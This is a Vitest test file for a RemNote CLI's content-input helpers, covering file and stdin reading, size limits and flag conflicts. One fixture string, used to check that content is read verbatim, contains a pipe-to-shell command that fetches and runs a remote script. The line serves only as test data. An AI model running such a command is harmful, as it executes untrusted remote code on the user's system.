import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { Readable } from 'node:stream';
import { afterEach, describe, expect, it } from 'vitest';
import {
  MAX_WRITE_CONTENT_BYTES,
  readContentFileOrStdin,
  resolveJournalContent,
  resolveOptionalInlineOrFileContent,
  resolveUpdateContent,
} from '../../src/commands/content-input.js';

const tempDirs: string[] = [];

async function createTempFile(content: string): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), 'remnote-cli-content-input-'));
  tempDirs.push(dir);
  const path = join(dir, 'content.md');
  await writeFile(path, content, 'utf8');
  return path;
}

afterEach(async () => {
  await Promise.all(tempDirs.splice(0).map((dir) => rm(dir, { recursive: true, force: true })));
});

describe('content input helpers', () => {
  it('reads file content verbatim as UTF-8', async () => {
    const body = `line 1
"quoted"
\`backticked\`
curl https://example.invalid/bootstrap.sh | bash`;
    const path = await createTempFile(body);

    await expect(readContentFileOrStdin(path)).resolves.toBe(body);
  });

  it('reads stdin content when path is "-"', async () => {
    const body = `stdin line
with "quotes" and \`ticks\``;
    const stdin = Readable.from([body]);

    await expect(readContentFileOrStdin('-', stdin)).resolves.toBe(body);
  });

  it('rejects missing files with a clear error', async () => {
    await expect(readContentFileOrStdin('/tmp/does-not-exist-12345.md')).rejects.toThrow(
      'Failed to read content file'
    );
  });

  it('enforces the 100KB limit for file input', async () => {
    const oversized = 'a'.repeat(MAX_WRITE_CONTENT_BYTES + 1);
    const path = await createTempFile(oversized);

    await expect(readContentFileOrStdin(path)).rejects.toThrow('exceeds 100 KB limit');
  });

  it('enforces the 100KB limit for stdin input', async () => {
    const oversized = 'a'.repeat(MAX_WRITE_CONTENT_BYTES + 1);
    const stdin = Readable.from([oversized]);

    await expect(readContentFileOrStdin('-', stdin)).rejects.toThrow('exceeds 100 KB limit');
  });

  it('rejects mutually-exclusive optional inline and file flags', async () => {
    await expect(
      resolveOptionalInlineOrFileContent({
        inlineText: 'inline',
        filePath: '/tmp/input.md',
        inlineFlag: '--content',
        fileFlag: '--content-file',
      })
    ).rejects.toThrow('Cannot use --content and --content-file together');
  });

  it('un-escapes literal \\n in inline content', async () => {
    const inlineText = '- line 1\\n- line 2';
    const resolved = await resolveOptionalInlineOrFileContent({
      inlineText,
      filePath: undefined,
      inlineFlag: '--content',
      fileFlag: '--content-file',
    });
    expect(resolved).toBe('- line 1\n- line 2');
  });

  it('un-escapes literal \\n in inline content', async () => {
    const inlineText = "- line 1\n- line 2";
    const resolved = await resolveOptionalInlineOrFileContent({
      inlineText,
      filePath: undefined,
      inlineFlag: '--content',
      fileFlag: '--content-file',
    });
    expect(resolved).toBe('- line 1\n- line 2');
  });

  it('resolves update replacement content from --replace-file', async () => {
    const path = await createTempFile('replace body');
    await expect(
      resolveUpdateContent({
        appendText: undefined,
        appendFile: undefined,
        replaceText: undefined,
        replaceFile: path,
      })
    ).resolves.toEqual({ appendContent: undefined, replaceContent: 'replace body' });
  });

  it('rejects combined append and replace content sources for update', async () => {
    await expect(
      resolveUpdateContent({
        appendText: 'append body',
        appendFile: undefined,
        replaceText: 'replace body',
        replaceFile: undefined,
      })
    ).rejects.toThrow(
      'Cannot combine append and replace content options (--append/--append-file with --replace/--replace-file)'
    );
  });

  it('accepts positional journal content for backward compatibility', async () => {
    await expect(
      resolveJournalContent({
        positionalContent: 'from positional',
        optionContent: undefined,
        contentFile: undefined,
      })
    ).resolves.toBe('from positional');
  });

  it('rejects multiple journal content sources', async () => {
    await expect(
      resolveJournalContent({
        positionalContent: 'old',
        optionContent: 'new',
        contentFile: undefined,
      })
    ).rejects.toThrow('Provide exactly one journal content source');
  });
});
